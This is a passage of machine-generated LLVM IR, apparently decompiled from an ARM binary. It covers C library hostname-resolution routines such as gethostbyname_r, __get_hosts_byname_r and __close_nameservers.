dec_label_pc_2f230:                               ; preds = %dec_label_pc_2f1b0, %dec_label_pc_2f1a0, %dec_label_pc_2ee8c, %dec_label_pc_2f1f0, %dec_label_pc_2f1e0, %dec_label_pc_2f1cc, %dec_label_pc_2f214, %dec_label_pc_2f220
  store i32 29896, i32* %r3.global-to-local, align 4
  %v0_2f234 = load i32, i32* @r5, align 4
  %v2_2f234 = add i32 %v0_2f234, 29896
  %v3_2f234 = inttoptr i32 %v2_2f234 to i32*
  %v4_2f234 = load i32, i32* %v3_2f234, align 4
  store i32 %v4_2f234, i32* %r0.global-to-local, align 4
  %v2_2f238 = icmp eq i32 %v4_2f234, 0
  br i1 %v2_2f238, label %bb65, label %bb64

bb64:                                             ; preds = %dec_label_pc_2f230
  store i32 193092, i32* %lr.global-to-local, align 4
  br label %bb65

bb65:                                             ; preds = %dec_label_pc_2f230, %bb64
  %v2_2f240 = xor i1 %v2_2f238, true
  call void @__pseudo_cond_branch(i1 %v2_2f240, i32 %v4_2f234)
  %v2_2f248 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_2f248, i32* %r4.global-to-local, align 4
  store i32 %v12_2ee3c, i32* @r7, align 4
  store i32 %v15_2ee3c, i32* @r8, align 4
  store i32 %v18_2ee3c, i32* @sb, align 4
  store i32 %v21_2ee3c, i32* @sl, align 4
  store i32 %v27_2ee3c, i32* %lr.global-to-local, align 4
  ret i32 %v4_2f234

; uselistorder directives
  uselistorder i32 %v4_2f234, { 1, 0, 2, 3 }
  uselistorder i32 %v2_2f1b0, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_2ef40, { 1, 0 }
  uselistorder i32 %v2_2ef28, { 1, 0 }
  uselistorder i32 %v2_2ef08, { 1, 0 }
  uselistorder i32 %v2_2f130, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32 %v0_2f100, { 1, 0, 2, 3 }
  uselistorder i32 %v1_2f0f0, { 1, 0 }
  uselistorder i32 %v0_2f090, { 1, 0, 2 }
  uselistorder i32 %v1_2f00817, { 1, 0 }
  uselistorder i32 %v1_2f00010, { 1, 0 }
  uselistorder i32 %v0_2f0009, { 1, 0 }
  uselistorder i32 %v1_2f008, { 1, 0 }
  uselistorder i32 %v3_2ef84, { 1, 0, 2, 3, 4 }
  uselistorder i16* %stack_var_-68, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 10, 8, 9, 11, 12, 13, 23, 0, 14, 15, 16, 1, 19, 17, 18, 20, 21, 22, 24, 25, 26, 27, 28 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 1, 6, 0, 8, 7, 16, 9, 10, 11, 12, 13, 14, 15, 17, 18 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0, 4, 5, 6, 7, 8, 9, 17, 10, 11, 12, 13, 14, 15, 16, 18, 19, 20, 21 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 5, 4, 7, 6, 8, 10, 9, 12, 11, 14, 13, 1, 0, 15, 17, 16, 19, 18, 20, 22, 21, 24, 23, 25, 26, 28, 27, 29, 31, 30, 36, 35, 51, 50, 32, 33, 34, 38, 37, 40, 39, 41, 43, 42, 44, 46, 45, 47, 49, 48, 54, 52, 53, 56, 55 }
  uselistorder i32 (i16*)* @__GI_fclose, { 1, 0 }
  uselistorder i32 (i32)* @atol, { 0, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 58, { 0, 6, 4, 7, 1, 2, 3, 5 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 0, 2, 1 }
  uselistorder i16 2, { 1, 0, 2, 3 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 25, 27, 28, 4, 29, 24, 5, 6, 35, 30, 31, 33, 34, 17, 42, 41, 26, 0, 32, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 1, 2, 3, 18, 19, 20, 21, 22, 23, 36, 37, 38, 39, 40 }
  uselistorder i32 ()* @skip_nospace, { 2, 1, 0 }
  uselistorder i32 -33252, { 1, 0 }
  uselistorder i32 879, { 0, 2, 4, 5, 1, 3, 6 }
  uselistorder i32 -33224, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -33224), { 1, 0 }
  uselistorder i32 29896, { 0, 2, 1, 3 }
  uselistorder label %bb65, { 1, 0 }
  uselistorder label %dec_label_pc_2f230, { 7, 6, 3, 4, 5, 0, 1, 2 }
  uselistorder label %dec_label_pc_2f1a0, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_2f154, { 1, 0 }
  uselistorder label %dec_label_pc_2f14c, { 1, 0 }
  uselistorder label %dec_label_pc_2f010, { 1, 0 }
  uselistorder label %dec_label_pc_2f130.backedge, { 4, 10, 8, 7, 9, 0, 1, 2, 3, 6, 5 }
  uselistorder label %dec_label_pc_2ee8c, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
}

define i32 @__close_nameservers() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_2f298 = load i32, i32* @r4, align 4
  store i32 %v3_2f298, i32* %stack_var_-20, align 4
  store i32 29904, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* @r5, align 4
  store i32 -33148, i32* %r3.global-to-local, align 4
  %v4_2f2ac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 29904) to i32*), align 4
  store i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -33148), i32* %r3.global-to-local, align 4
  store i32 193216, i32* @lr, align 4
  %v1_2f2bc = icmp ne i32 %v4_2f2ac, add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -33148)
  call void @__pseudo_cond_branch(i1 %v1_2f2bc, i32 ptrtoint (i32* @global_var_264e8.3412 to i32))
  store i32 29908, i32* %r3.global-to-local, align 4
  store i32 29912, i32* @r7, align 4
  store i32 29900, i32* @r6, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_2f2d0 = load i32, i32* @r5, align 4
  %v3_2f2d0 = add i32 %v1_2f2d0, 29908
  %v4_2f2d0 = inttoptr i32 %v3_2f2d0 to i32*
  store i32 0, i32* %v4_2f2d0, align 4
  %v0_2f2d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_2f2d4 = load i32, i32* @r5, align 4
  %v2_2f2d4 = load i32, i32* %r4.global-to-local, align 4
  %v3_2f2d4 = add i32 %v2_2f2d4, %v1_2f2d4
  %v4_2f2d4 = inttoptr i32 %v3_2f2d4 to i32*
  store i32 %v0_2f2d4, i32* %v4_2f2d4, align 4
  br label %dec_label_pc_2f2ec

dec_label_pc_2f2dc:                               ; preds = %dec_label_pc_2f2ec
  store i32 %v4_2f300, i32* %r3.global-to-local, align 4
  store i32 %v1_2f2f4, i32* %v3_2f2ec, align 4
  %v0_2f2e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_2f2e4 = load i32, i32* %r2.global-to-local, align 4
  %v4_2f2e4 = mul i32 %v1_2f2e4, 4
  %v5_2f2e4 = add i32 %v4_2f2e4, %v0_2f2e4
  %v6_2f2e4 = inttoptr i32 %v5_2f2e4 to i32*
  %v7_2f2e4 = load i32, i32* %v6_2f2e4, align 4
  store i32 %v7_2f2e4, i32* @r0, align 4
  %v0_2f2e8 = call i32 @free()
  br label %dec_label_pc_2f2ec

dec_label_pc_2f2ec:                               ; preds = %entry, %dec_label_pc_2f2dc
  %v0_2f2ec = load i32, i32* @r5, align 4
  %v1_2f2ec = load i32, i32* @r7, align 4
  %v2_2f2ec = add i32 %v1_2f2ec, %v0_2f2ec
  %v3_2f2ec = inttoptr i32 %v2_2f2ec to i32*
  %v4_2f2ec = load i32, i32* %v3_2f2ec, align 4
  store i32 %v4_2f2ec, i32* @r4, align 4
  %v2_2f2f0 = icmp eq i32 %v4_2f2ec, 0
  %v1_2f2f4 = add i32 %v4_2f2ec, -1
  store i32 %v1_2f2f4, i32* %r2.global-to-local, align 4
  %v0_2f2f8 = load i32, i32* @r6, align 4
  store i32 %v0_2f2f8, i32* %r3.global-to-local, align 4
  %v2_2f300 = add i32 %v0_2f2f8, %v0_2f2ec
  %v3_2f300 = inttoptr i32 %v2_2f300 to i32*
  %v4_2f300 = load i32, i32* %v3_2f300, align 4
  br i1 %v2_2f2f0, label %dec_label_pc_2f300, label %dec_label_pc_2f2dc

dec_label_pc_2f300:                               ; preds = %dec_label_pc_2f2ec
  store i32 %v4_2f300, i32* @r0, align 4
  %v0_2f304 = call i32 @free()
  %v0_2f308 = load i32, i32* @r4, align 4
  %v1_2f308 = load i32, i32* @r5, align 4
  %v2_2f308 = load i32, i32* @r6, align 4
  %v3_2f308 = add i32 %v2_2f308, %v1_2f308
  %v4_2f308 = inttoptr i32 %v3_2f308 to i32*
  store i32 %v0_2f308, i32* %v4_2f308, align 4
  %v2_2f310 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_2f310, i32* %r4.global-to-local, align 4
  ret i32 %v0_2f304

; uselistorder directives
  uselistorder i32 %v4_2f300, { 1, 0 }
  uselistorder i32 %v1_2f2f4, { 1, 0 }
  uselistorder i32* %v3_2f2ec, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 29900, { 3, 1, 6, 4, 5, 0, 2 }
  uselistorder i32 29912, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 29908, { 0, 1, 3, 7, 4, 8, 2, 6, 5, 9, 10, 12, 11, 13 }
  uselistorder i32 -33148, { 1, 2, 0, 3 }
  uselistorder i32 29904, { 4, 5, 1, 0, 7, 2, 6, 3, 8 }
  uselistorder label %dec_label_pc_2f2ec, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1) local_unnamed_addr {
entry:
  %v0_2f330 = load i32, i32* @lr, align 4
  %v0_2f33c = load i32, i32* @r1, align 4
  store i32 %v0_2f33c, i32* @lr, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 0, i32* @r0, align 4
  store i32 %v0_2f33c, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_2f36c = call i32 @__read_etc_hosts_r()
  store i32 %v0_2f330, i32* @lr, align 4
  ret i32 %v0_2f36c
}

define i32 @gethostbyname_r() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp17 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp28, i32* %stack_var_0, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_2f384 = load i32, i32* @r1, align 4
  store i32 %v0_2f384, i32* @r7, align 4
  store i32 %tmp28, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_2f390 = load i32, i32* @r0, align 4
  store i32 %v0_2f390, i32* @fp, align 4
  %v2_2f390 = icmp eq i32 %v0_2f390, 0
  %v2_2f394 = inttoptr i32 %tmp28 to i32*
  store i32 0, i32* %v2_2f394, align 4
  %v0_2f398 = load i32, i32* @r2, align 4
  %v0_2f39c = load i32, i32* @r3, align 4
  store i32 %v0_2f39c, i32* @r6, align 4
  br i1 %v2_2f390, label %bb, label %dec_label_pc_2f3a8

bb:                                               ; preds = %entry
  %v1_2f3a0 = load i32, i32* @r5, align 4
  %v2_2f3a0 = add i32 %v1_2f3a0, 22
  store i32 %v2_2f3a0, i32* @r5, align 4
  br label %dec_label_pc_2f698

dec_label_pc_2f3a8:                               ; preds = %entry
  store i32 79220, i32* %r3.global-to-local, align 4
  store i32 79216, i32* %r2.global-to-local, align 4
  %v0_2f3b0 = call i32 @__aeabi_read_tp()
  store i32 %v0_2f3b0, i32* %r0.global-to-local, align 4
  %v3_2f3b8 = load i16, i16* @global_var_42934.3040, align 2
  %v4_2f3b8 = sext i16 %v3_2f3b8 to i32
  store i32 %v4_2f3b8, i32* %r3.global-to-local, align 4
  store i32 %v4_2f3b8, i32* %r2.global-to-local, align 4
  %v2_2f3c0 = add i32 %v4_2f3b8, %v0_2f3b0
  %v3_2f3c0 = inttoptr i32 %v2_2f3c0 to i32*
  %v4_2f3c0 = load i32, i32* %v3_2f3c0, align 4
  store i32 %v4_2f3c0, i32* @r8, align 4
  %v0_2f3c4 = load i32, i32* @r5, align 4
  store i32 %v0_2f3c4, i32* %v3_2f3c0, align 4
  store i32 %v0_2f3b0, i32* @r4, align 4
  store i32 2, i32* @r1, align 4
  %v0_2f3d8 = load i32, i32* @fp, align 4
  store i32 %v0_2f3d8, i32* %r0.global-to-local, align 4
  %v0_2f3dc = load i32, i32* @r7, align 4
  store i32 %v0_2f3dc, i32* %r2.global-to-local, align 4
  store i32 %v0_2f398, i32* %r3.global-to-local, align 4
  %v1_2f3ec = call i32 @__get_hosts_byname_r(i32 %v0_2f3d8)
  store i32 %v1_2f3ec, i32* %r0.global-to-local, align 4
  store i32 %v1_2f3ec, i32* @r5, align 4
  %v2_2f3f0 = icmp eq i32 %v1_2f3ec, 0
  br i1 %v2_2f3f0, label %.thread4, label %dec_label_pc_2f404

.thread4:                                         ; preds = %dec_label_pc_2f3a8
  store i32 79156, i32* %r3.global-to-local, align 4
  %v4_2f3f8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2f400.3594 to i32), i32 79156) to i32*), align 4
  store i32 %v4_2f3f8, i32* %r3.global-to-local, align 4
  %v1_2f3fc = load i32, i32* @r8, align 4
  %v2_2f3fc = load i32, i32* @r4, align 4
  %v4_2f3fc = add i32 %v2_2f3fc, %v4_2f3f8
  %v5_2f3fc = inttoptr i32 %v4_2f3fc to i32*
  store i32 %v1_2f3fc, i32* %v5_2f3fc, align 4
  br label %dec_label_pc_2f698

dec_label_pc_2f404:                               ; preds = %dec_label_pc_2f3a8
  store i32 %tmp17, i32* %r1.global-to-local, align 4
  %v1_2f408 = inttoptr i32 %tmp17 to i32*
  %v2_2f408 = load i32, i32* %v1_2f408, align 4
  store i32 %v2_2f408, i32* %r3.global-to-local, align 4
  %v7_2f40c = icmp eq i32 %v2_2f408, 1
  br i1 %v7_2f40c, label %dec_label_pc_2f428, label %dec_label_pc_2f414

dec_label_pc_2f414:                               ; preds = %dec_label_pc_2f404
  %v7_2f414 = icmp eq i32 %v2_2f408, 4
  br i1 %v7_2f414, label %dec_label_pc_2f450, label %dec_label_pc_2f41c

dec_label_pc_2f41c:                               ; preds = %dec_label_pc_2f414
  %v3_2f41c = icmp eq i32 %v2_2f408, -1
  br i1 %v3_2f41c, label %dec_label_pc_2f43c, label %dec_label_pc_2f698

dec_label_pc_2f428:                               ; preds = %dec_label_pc_2f404
  %v7_2f428 = icmp eq i32 %v1_2f3ec, 2
  br i1 %v7_2f428, label %.thread6, label %bb33

bb33:                                             ; preds = %dec_label_pc_2f428
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_2f458

.thread6:                                         ; preds = %dec_label_pc_2f428
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_2f458

dec_label_pc_2f43c:                               ; preds = %dec_label_pc_2f41c
  %v3_2f440 = load i16, i16* @global_var_42934.3040, align 2
  %v4_2f440 = sext i16 %v3_2f440 to i32
  store i32 %v4_2f440, i32* %r3.global-to-local, align 4
  %v0_2f444 = load i32, i32* @r4, align 4
  %v2_2f444 = add i32 %v0_2f444, %v4_2f440
  %v3_2f444 = inttoptr i32 %v2_2f444 to i32*
  %v4_2f444 = load i32, i32* %v3_2f444, align 4
  store i32 %v4_2f444, i32* %r3.global-to-local, align 4
  %v7_2f448 = icmp eq i32 %v4_2f444, 2
  br i1 %v7_2f448, label %dec_label_pc_2f450, label %dec_label_pc_2f698

dec_label_pc_2f450:                               ; preds = %dec_label_pc_2f43c, %dec_label_pc_2f414
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_2f458

dec_label_pc_2f458:                               ; preds = %.thread6, %bb33, %dec_label_pc_2f450
  %storemerge2 = phi i32 [ 0, %dec_label_pc_2f450 ], [ 0, %bb33 ], [ 1, %.thread6 ]
  store i32 79052, i32* %r3.global-to-local, align 4
  %v0_2f45c = call i32 @__aeabi_read_tp()
  %v3_2f460 = load i16, i16* @global_var_42934.3040, align 2
  %v4_2f460 = sext i16 %v3_2f460 to i32
  store i32 %tmp17, i32* @ip, align 4
  %v0_2f468 = load i32, i32* @r8, align 4
  %v3_2f468 = add i32 %v4_2f460, %v0_2f45c
  %v4_2f468 = inttoptr i32 %v3_2f468 to i32*
  store i32 %v0_2f468, i32* %v4_2f468, align 4
  store i32 -1, i32* @r3, align 4
  %v1_2f474 = load i32, i32* @ip, align 4
  %v2_2f474 = inttoptr i32 %v1_2f474 to i32*
  store i32 -1, i32* %v2_2f474, align 4
  %v0_2f478 = load i32, i32* @fp, align 4
  %v1_2f478 = inttoptr i32 %v0_2f478 to i8*
  store i32 %v0_2f478, i32* %r0.global-to-local, align 4
  %v3_2f47c = call i32 @strlen(i8* %v1_2f478)
  store i32 %v3_2f47c, i32* %r0.global-to-local, align 4
  %v1_2f480 = add i32 %v3_2f47c, 1
  store i32 %v1_2f480, i32* @r4, align 4
  %v0_2f484 = load i32, i32* @r6, align 4
  %v7_2f488 = icmp sgt i32 %v0_2f484, %v1_2f480
  br i1 %v7_2f488, label %dec_label_pc_2f48c, label %dec_label_pc_2f694

dec_label_pc_2f48c:                               ; preds = %dec_label_pc_2f458
  %v0_2f48c = load i32, i32* @fp, align 4
  store i32 %v0_2f48c, i32* @r1, align 4
  store i32 %v1_2f480, i32* @r2, align 4
  store i32 %v0_2f398, i32* @r0, align 4
  %v0_2f498 = call i32 @memcpy()
  store i32 %v0_2f498, i32* %r0.global-to-local, align 4
  %v1_2f4a0 = load i32, i32* @r4, align 4
  %v2_2f4a0 = add i32 %v1_2f4a0, %v0_2f398
  store i32 %v2_2f4a0, i32* %r1.global-to-local, align 4
  %v1_2f4a4 = sub i32 0, %v2_2f4a0
  %v1_2f4a8 = load i32, i32* @r6, align 4
  %v2_2f4a8 = sub i32 %v1_2f4a8, %v1_2f4a0
  store i32 %v2_2f4a8, i32* %r2.global-to-local, align 4
  %v1_2f4ac = urem i32 %v1_2f4a4, 4
  store i32 %v1_2f4ac, i32* %r3.global-to-local, align 4
  %v2_2f4b0 = sub i32 %v2_2f4a8, %v1_2f4ac
  store i32 %v2_2f4b0, i32* @sl, align 4
  %v1_2f4b4 = add i32 %v2_2f4b0, -8
  store i32 %v1_2f4b4, i32* @r5, align 4
  %v7_2f4bc = icmp slt i32 %v1_2f4b4, 256
  br i1 %v7_2f4bc, label %dec_label_pc_2f694, label %dec_label_pc_2f4c0

dec_label_pc_2f4c0:                               ; preds = %dec_label_pc_2f48c
  %v2_2f4c0 = add i32 %v1_2f4ac, %v2_2f4a0
  store i32 %v2_2f4c0, i32* @sb, align 4
  store i32 %v0_2f398, i32* @ip, align 4
  %v1_2f4c8 = add i32 %v2_2f4c0, 8
  store i32 %v1_2f4c8, i32* @r6, align 4
  store i32 0, i32* @r4, align 4
  %v1_2f4d0 = add i32 %v2_2f4c0, 16
  store i32 %v1_2f4d0, i32* @r8, align 4
  %v4_2f4d4 = inttoptr i32 %v2_2f4c0 to i32*
  store i32 %v0_2f398, i32* %v4_2f4d4, align 4
  %v0_2f4d8 = load i32, i32* @fp, align 4
  store i32 %v0_2f4d8, i32* %r0.global-to-local, align 4
  %v0_2f4dc = load i32, i32* @r4, align 4
  %v1_2f4dc = load i32, i32* @sb, align 4
  %v2_2f4dc = add i32 %v1_2f4dc, 4
  %v3_2f4dc = inttoptr i32 %v2_2f4dc to i32*
  store i32 %v0_2f4dc, i32* %v3_2f4dc, align 4
  %v0_2f4e0 = load i32, i32* @r8, align 4
  store i32 %v0_2f4e0, i32* %r1.global-to-local, align 4
  %v2_2f4e4 = inttoptr i32 %v0_2f4d8 to i8*
  %v3_2f4e4 = call i32 @inet_aton(i8* %v2_2f4e4, i32 %v0_2f4e0)
  store i32 %v3_2f4e4, i32* %r0.global-to-local, align 4
  %v1_2f4e8 = load i32, i32* @r4, align 4
  %v9_2f4e8 = icmp eq i32 %v3_2f4e4, %v1_2f4e8
  br i1 %v9_2f4e8, label %dec_label_pc_2f52c, label %dec_label_pc_2f4f0

dec_label_pc_2f4f0:                               ; preds = %dec_label_pc_2f4c0
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_2f4f4 = load i32, i32* @r7, align 4
  %v2_2f4f4 = add i32 %v1_2f4f4, 8
  %v3_2f4f4 = inttoptr i32 %v2_2f4f4 to i32*
  store i32 2, i32* %v3_2f4f4, align 4
  %v0_2f4f8 = load i32, i32* %r3.global-to-local, align 4
  %v2_2f4f8 = mul i32 %v0_2f4f8, 2
  %v1_2f4fc = load i32, i32* @r7, align 4
  %v2_2f4fc = add i32 %v1_2f4fc, 12
  %v3_2f4fc = inttoptr i32 %v2_2f4fc to i32*
  store i32 %v2_2f4f8, i32* %v3_2f4fc, align 4
  %v3_2f500 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_2f500, i32* %r1.global-to-local, align 4
  store i32 %v0_2f398, i32* %r2.global-to-local, align 4
  store i32 %tmp17, i32* %r3.global-to-local, align 4
  %v0_2f50c = load i32, i32* @r4, align 4
  store i32 %v0_2f50c, i32* @r5, align 4
  %v0_2f510 = load i32, i32* @r8, align 4
  %v1_2f510 = load i32, i32* @sb, align 4
  %v2_2f510 = add i32 %v1_2f510, 8
  %v3_2f510 = inttoptr i32 %v2_2f510 to i32*
  store i32 %v0_2f510, i32* %v3_2f510, align 4
  %v0_2f514 = load i32, i32* @r7, align 4
  %v1_2f514 = load i32, i32* %r1.global-to-local, align 4
  %v2_2f514 = inttoptr i32 %v1_2f514 to i32*
  store i32 %v0_2f514, i32* %v2_2f514, align 4
  %v0_2f518 = load i32, i32* @r7, align 4
  %v1_2f518 = inttoptr i32 %v0_2f518 to i32*
  %v2_2f518 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_2f518, i32* %v1_2f518, align 4
  %v3_2f518 = add i32 %v0_2f518, 4
  %v4_2f518 = inttoptr i32 %v3_2f518 to i32*
  %v5_2f518 = load i32, i32* @sb, align 4
  store i32 %v5_2f518, i32* %v4_2f518, align 4
  %v0_2f51c = load i32, i32* @r6, align 4
  %v1_2f51c = load i32, i32* @r7, align 4
  %v2_2f51c = add i32 %v1_2f51c, 16
  %v3_2f51c = inttoptr i32 %v2_2f51c to i32*
  store i32 %v0_2f51c, i32* %v3_2f51c, align 4
  %v0_2f520 = load i32, i32* @r4, align 4
  %v1_2f520 = load i32, i32* %r3.global-to-local, align 4
  %v2_2f520 = inttoptr i32 %v1_2f520 to i32*
  store i32 %v0_2f520, i32* %v2_2f520, align 4
  %v0_2f524 = load i32, i32* @r4, align 4
  %v1_2f524 = load i32, i32* @r6, align 4
  %v2_2f524 = add i32 %v1_2f524, 4
  %v3_2f524 = inttoptr i32 %v2_2f524 to i32*
  store i32 %v0_2f524, i32* %v3_2f524, align 4
  br label %dec_label_pc_2f698

dec_label_pc_2f52c:                               ; preds = %dec_label_pc_2f4c0
  store i32 %storemerge2, i32* @ip, align 4
  %v2_2f530 = icmp eq i32 %storemerge2, 0
  br i1 %v2_2f530, label %dec_label_pc_2f538, label %dec_label_pc_2f568

dec_label_pc_2f538:                               ; preds = %dec_label_pc_2f52c
  %v0_2f544 = load i32, i32* @fp, align 4
  store i32 %v0_2f544, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_2f54c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_2f54c, i32* %r2.global-to-local, align 4
  %v2_2f550 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_2f550, i32* %r3.global-to-local, align 4
  %v7_2f55c = inttoptr i32 %v0_2f544 to i8*
  %v8_2f55c = call i32 @__dns_lookup(i8* %v7_2f55c, i32 1, i32 %v2_2f54c, i32 %v2_2f550)
  store i32 %v8_2f55c, i32* %r0.global-to-local, align 4
  %v1_2f560 = icmp slt i32 %v8_2f55c, 0
  br i1 %v1_2f560, label %dec_label_pc_2f568, label %dec_label_pc_2f57c

dec_label_pc_2f568:                               ; preds = %dec_label_pc_2f538, %dec_label_pc_2f52c
  store i32 %tmp17, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r5, align 4
  store i32 1, i32* %v1_2f408, align 4
  br label %dec_label_pc_2f698

dec_label_pc_2f57c:                               ; preds = %dec_label_pc_2f538
  store i32 %tmp10, i32* %r3.global-to-local, align 4
  %v7_2f580 = icmp eq i32 %tmp10, 1
  br i1 %v7_2f580, label %dec_label_pc_2f588, label %dec_label_pc_2f660

dec_label_pc_2f588:                               ; preds = %dec_label_pc_2f57c
  store i32 0, i32* @r2, align 4
  store i32 12, i32* @r4, align 4
  store i32 12, i32* @r3, align 4
  %v0_2f5a0 = load i32, i32* @r5, align 4
  %v2_2f5a0 = add i32 %v0_2f5a0, -12
  store i32 %v2_2f5a0, i32* @r8, align 4
  %v8_2f5a0 = icmp slt i32 %v2_2f5a0, 0
  br i1 %v8_2f5a0, label %bb35, label %dec_label_pc_2f5ac

bb35:                                             ; preds = %dec_label_pc_2f588
  store i32 34, i32* @r5, align 4
  br label %dec_label_pc_2f680

dec_label_pc_2f5ac:                               ; preds = %dec_label_pc_2f588
  %v0_2f5ac = load i32, i32* @r6, align 4
  store i32 %v0_2f5ac, i32* @r1, align 4
  %v2_2f5b0 = add i32 %v0_2f5ac, 12
  store i32 %v2_2f5b0, i32* @r0, align 4
  %v2_2f5b4 = call i32 @memmove(i32 %v2_2f5b0, i32 %v0_2f5ac)
  %v0_2f5b8 = load i32, i32* @sb, align 4
  %v1_2f5b8 = add i32 %v0_2f5b8, 4
  store i32 %v1_2f5b8, i32* @r3, align 4
  %v1_2f5bc = load i32, i32* @r4, align 4
  %v2_2f5bc = add i32 %v1_2f5bc, %v1_2f5b8
  store i32 %v2_2f5bc, i32* @r5, align 4
  store i32 %v2_2f5bc, i32* @r0, align 4
  store i32 4, i32* @r2, align 4
  %v0_2f5cc = call i32 @memcpy()
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_2f5d8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_2f5d8

dec_label_pc_2f5d8:                               ; preds = %dec_label_pc_2f5ac, %dec_label_pc_2f5d8
  %v0_2f5d8 = phi i32 [ %v0_2f5d8.pre, %dec_label_pc_2f5ac ], [ %v1_2f5dc, %dec_label_pc_2f5d8 ]
  %v1_2f5d8 = load i32, i32* @r6, align 4
  %v7_2f5d8 = inttoptr i32 %v1_2f5d8 to i32*
  store i32 %v0_2f5d8, i32* %v7_2f5d8, align 4
  %v0_2f5dc = load i32, i32* @r5, align 4
  %v1_2f5dc = add i32 %v0_2f5dc, 4
  store i32 %v1_2f5dc, i32* @r5, align 4
  %v0_2f5e0 = load i32, i32* %r0.global-to-local, align 4
  %v1_2f5e0 = add i32 %v0_2f5e0, 1
  store i32 %v1_2f5e0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v9_2f5e8 = icmp eq i32 %v1_2f5e0, 0
  br i1 %v9_2f5e8, label %dec_label_pc_2f5d8, label %dec_label_pc_2f5f0

dec_label_pc_2f5f0:                               ; preds = %dec_label_pc_2f5d8
  %v3_2f5f0 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_2f5f0, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_2f5f8 = icmp eq i32 %v3_2f5f0, 0
  %v1_2f5fc = load i32, i32* @r6, align 4
  %v5_2f5fc = mul i32 %v1_2f5e0, 4
  %v6_2f5fc = add i32 %v1_2f5fc, %v5_2f5fc
  %v7_2f5fc = inttoptr i32 %v6_2f5fc to i32*
  store i32 0, i32* %v7_2f5fc, align 4
  br i1 %v2_2f5f8, label %dec_label_pc_2f62c, label %dec_label_pc_2f604

dec_label_pc_2f604:                               ; preds = %dec_label_pc_2f5f0
  %v0_2f604 = load i32, i32* @r4, align 4
  %v1_2f604 = inttoptr i32 %v0_2f604 to i8*
  store i32 %v0_2f604, i32* %r0.global-to-local, align 4
  %v3_2f608 = call i32 @strlen(i8* %v1_2f604)
  store i32 %v3_2f608, i32* %r0.global-to-local, align 4
  %v0_2f60c = load i32, i32* @r8, align 4
  %tmp = icmp ugt i32 %v0_2f60c, %v3_2f608
  br i1 %tmp, label %dec_label_pc_2f614, label %dec_label_pc_2f62c

dec_label_pc_2f614:                               ; preds = %dec_label_pc_2f604
  %v0_2f614 = load i32, i32* @r4, align 4
  store i32 %v0_2f614, i32* @r1, align 4
  %v0_2f618 = load i32, i32* @r5, align 4
  store i32 %v0_2f618, i32* %r0.global-to-local, align 4
  %v2_2f61c = inttoptr i32 %v0_2f618 to i8*
  %v3_2f61c = call i32 @strcpy(i8* %v2_2f61c, i32 %v0_2f614)
